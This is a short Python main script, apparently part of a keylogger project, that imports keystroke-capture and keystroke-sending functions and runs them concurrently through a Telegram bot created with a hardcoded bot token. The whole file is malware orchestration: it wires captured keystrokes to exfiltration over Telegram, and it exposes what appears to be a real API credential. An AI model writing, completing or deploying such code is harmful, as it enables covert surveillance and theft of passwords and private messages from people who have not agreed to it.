import asyncio
import logging
import time
import sys
from telegram import Bot
from helpers import registro_errores
from keylogger import capturar_teclas, enviar_teclas



async def main():
    logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(message)s")
    
    try:
        bot = Bot(token="7348242610:AAG4Jyl41n0DqCX5AYKskb3AXkJXB2IDJso")
        
        await asyncio.gather(
            capturar_teclas(bot),
            enviar_teclas(bot),
        )
    except Exception as e:
        registro_errores(f"Initialization error: {e}")
        print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
